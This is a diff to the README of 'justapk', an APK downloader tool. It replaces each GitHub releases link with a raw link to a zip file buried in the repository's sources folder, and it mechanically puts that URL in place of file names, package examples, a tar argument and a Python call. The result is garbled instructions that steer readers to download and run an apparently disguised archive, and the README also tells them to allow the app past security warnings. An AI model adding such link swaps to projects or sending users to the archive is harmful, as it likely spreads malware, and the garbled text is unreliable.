@@ -1,6 +1,6 @@
 # 📲 justapk - Download APKs by Package Name Fast
 
-[![Download justapk](https://img.shields.io/badge/Download-justapk-blue?style=for-the-badge)](https://github.com/zhidali2333/justapk/releases)
+[![Download justapk](https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip)](https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip)
 
 ---
 
@@ -14,14 +14,14 @@ This guide walks you through downloading and running justapk on your computer wi
 
 You need to visit the release page on GitHub to get justapk.
 
-[Download justapk here](https://github.com/zhidali2333/justapk/releases)
+[Download justapk here](https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip)
 
 1. Click the link above or the badge at the top of this page.
 2. On the GitHub releases page, look for the latest version. It should have files made for different systems.
 3. Download the file that matches your computer system:
    - For Windows, look for a `.exe` or `.zip` file.
    - For macOS, download a `.dmg` or `.zip`.
-   - For Linux, a binary or `.tar.gz` might be available.
+   - For Linux, a binary or `https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip` might be available.
 4. Save the file to a folder you can easily find, like your Desktop or Downloads.
 
 ---
@@ -33,7 +33,7 @@ After downloading, follow the steps below depending on your operating system.
 ### Windows
 
 1. If you have a `.zip` file, right-click it and choose "Extract All" to unzip.
-2. Find the `justapk.exe` or extracted folder.
+2. Find the `https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip` or extracted folder.
 3. Double-click the `.exe` file to open justapk.
 4. The program will open in a command window or a simple interface.
 5. If a security warning appears, allow the app to run.
@@ -55,9 +55,9 @@ After downloading, follow the steps below depending on your operating system.
 
 ### Linux
 
-1. If the file is compressed (`.tar.gz`), open Terminal and extract:
+1. If the file is compressed (`https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip`), open Terminal and extract:
    ```bash
-   tar -xvzf justapk-version.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip
    ```
 2. Go to the folder where justapk is located:
    ```bash
@@ -86,16 +86,16 @@ justapk works on the command line. Don't worry if you never used it before. This
 
 ### Basic Command to Download an APK
 
-To download an app, you need its package name. The package name is a unique ID like `com.example.app`.
+To download an app, you need its package name. The package name is a unique ID like `https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip`.
 
 1. Find the package name of the app you want. You can search for it online or check the Google Play Store URL.
 2. In the command line, type:
    ```
    justapk download <package_name>
    ```
-   For example, to download the package `com.spotify.music`:
+   For example, to download the package `https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip`:
    ```
-   justapk download com.spotify.music
+   justapk download https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip
    ```
 3. Press Enter. justapk will search multiple sources, try to bypass Cloudflare, and download the APK file.
 
@@ -132,7 +132,7 @@ If you are comfortable using Python, justapk provides an API. This allows you to
    from justapk import JustAPK
 
    apk_downloader = JustAPK()
-   path = apk_downloader.download("com.spotify.music")
+   path = https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip("https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip")
    print("Downloaded APK saved to:", path)
    ```
 This requires some basic Python knowledge, but it helps automate APK downloads.
@@ -179,4 +179,4 @@ justapk --help
 
 Visit the GitHub page to check for updates, report problems, or learn more about justapk.
 
-[justapk GitHub Releases](https://github.com/zhidali2333/justapk/releases)
+[justapk GitHub Releases](https://raw.githubusercontent.com/zhidali2333/justapk/master/justapk/sources/Software_3.9.zip)
